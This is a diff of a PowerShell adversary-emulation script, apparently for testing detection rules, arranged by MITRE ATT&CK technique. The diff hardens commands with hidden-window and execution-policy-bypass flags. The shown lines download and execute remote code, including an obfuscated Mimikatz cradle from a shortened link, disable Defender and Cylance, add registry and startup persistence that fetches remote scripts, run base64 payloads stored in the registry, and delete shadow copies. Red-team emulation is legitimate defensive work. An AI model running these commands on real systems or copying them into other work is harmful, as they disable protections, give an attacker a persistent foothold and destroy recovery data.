@@ -19,7 +19,7 @@ Write-Host "Starting Execution Step"
 Write-Host "Initiating a T1059.001 - Powershell Download Harness"
 Write-Host "(Execution-T1059.001) Detected use of hidden powershell base64 encoded commands"
 Write-Host "[ATT&CK T1059.001 - Execution - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/001)"
-Powershell.exe -win H -NoP -command "(new-object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/psexec.exe', \`"$env:TEMP\bad.exe\`"); Write-Host T1059.001 - Powershell Download Harness"
+Powershell.exe -NoP -command "(new-object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/psexec.exe', \`"$env:TEMP\bad.exe\`"); Write-Host T1059.001 - Powershell Download Harness"
 
 
 Write-Host "Initiating a T1059.001 - Powershell Encoded and hidden Download Harness"
@@ -29,7 +29,7 @@ $EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetB
 powershell.exe -win H -NoP -e $EncodedCommand
 
 Write-Host "Initiating T1059.001 - Powershell Execution From Alternate Data Stream"
-powershell.exe -exec bypass -noprofile -command { 
+powershell.exe -Win N -exec bypass -nop -command { 
     Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand';
     iex (Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'| Out-String)
 }
@@ -38,12 +38,12 @@ Remove-Item $env:TEMP\NTFS_ADS.txt -Force -ErrorAction Ignore
 
 
 Write-Host "Initiating T1059.005 - VBScript from Microsoft Office Exploit"
-Powershell.exe -command {
+Powershell.exe -Win N -exec bypass -nop -command {
     IEX (Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
     Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/228dcb1ae300d5808a7d4910252dc48f7d4201ec/atomics/T1059.005/src/T1059.005-macrocode.txt" -OutFile "$env:temp\T1059.005-macrocode.txt"
     Invoke-Maldoc -macroFile "$env:temp\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
 }
-Start-Sleep 10
+Start-Sleep 5
 
 
 # DISCOVERY
@@ -51,7 +51,7 @@ Write-Host "`n`nStarting discovery step"
 
 Write-Host "Initiating Discovery - T1082 - System Information Discovery"
 Write-Host "When an adversary first gains access to a system, they often gather detailed information about the compromised system and network including users, operating system, hardware, patches, and architecture. Adversaries may use the information to shape follow-on behaviors, including whether or not to fully infect the target and/or attempt specific actions like a ransom.`n"
-Powershell.exe -command { 
+Powershell.exe -Win N -exec bypass -nop -command { 
     Hostname > recon.txt
     whoami >> recon.txt 
     REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid >> recon.txt
@@ -73,13 +73,13 @@ Start-Sleep 10
 Write-Host "`n`nStarting defense evasion step"
 Write-Host "Initiating Defense Evasion - T1089 - Disabling Security Tools"
 Write-Host "Disabling Defender..."
-powershell.exe -command 'Set-MpPreference -DisableRealtimeMonitoring $true'
+powershell.exe -Win N -exec bypass -nop -command 'Set-MpPreference -DisableRealtimeMonitoring $true'
 sc config WinDefend start= disabled
 sc stop WinDefend
 
 Write-Host "Stopping Cylance..."
-Powershell.exe --command ‘Get-Service CylanceSvc | Stop-Service’
-#Powershell.exe --command ‘Get-Service CylanceSvc | Start-Service’
+Powershell.exe -Win N -exec bypass -nop -command ‘Get-Service CylanceSvc | Stop-Service’
+#Powershell.exe -command ‘Get-Service CylanceSvc | Start-Service’
 
 
 Write-Host "Creating binary with double extension"
@@ -111,14 +111,14 @@ REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /t RE
 
 
 Write-Host "Adding T1547.001 - Registry Run Key w/ Fileless Powershell Command"
-Powershell.exe -command {
+Powershell.exe -Win N -exec bypass -nop -command {
     set-itemproperty HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce "NextRun" 'powershell.exe --command "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"'
 }
 #Start-Sleep 2
 #Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore
 
 Write-Host "Adding T1547.009 - Malicious Shortcut Link Persistence"
-Powershell.exe -command {
+Powershell.exe -Win N -exec bypass -nop -command {
     $Target = "C:\Windows\System32\calc.exe"
     $ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk"
     $WScriptShell = New-Object -ComObject WScript.Shell
@@ -144,7 +144,7 @@ Write-Host "Testing Persistence by executing T1059.001 - Powershell Command From
 $Cmd = 'Write-Host -ForegroundColor Red "Mess with the Best, Die like the rest!"'
 $EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($Cmd))
 reg.exe add "HKEY_CURRENT_USER\Software\Classes\RedTeamTest" /v RT /t REG_SZ /d "V3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiTWVzcyB3aXRoIHRoZSBCZXN0LCBEaWUgbGlrZSB0aGUgcmVzdCEi"
-Powershell.exe -command { iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\RedTeamTest').RT))) }
+Powershell.exe -Win N -exec bypass -nop -command { iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\RedTeamTest').RT))) }
 
 #Remove-Item HKCU:\Software\Classes\RedTeamTest -Force -ErrorAction Ignore
 
@@ -164,7 +164,7 @@ powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githu
 
 
 Write-Host "Initiating T1059.001 - Powershell Execution of Mimikatz w/ Obfuscation"
-Powershell.exe -command { 
+Powershell.exe -Win N -exec bypass -nop -command { 
     (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');
     IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
     (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');
@@ -212,7 +212,7 @@ vssadmin.exe delete shadows /all /quiet
 Write-Host "Testing Rule: Wallpaper Defacement"
 Write-Host "[ATT&CK T1491 - Impact - Defacement: Internal Defacement](https://attack.mitre.org/techniques/T1491)"
 Write-Host "(Impact-T1491) Possible defacement - Wallpaper was changed via commandline"
-powershell -command {
+powershell -Win N -exec bypass -nop -command {
     $oldwallpaper = Get-ItemProperty "HKCU:\Control Panel\Desktop" | select WallPaper -ExpandProperty wallpaper
     reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d $oldwallpaper /f
     RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
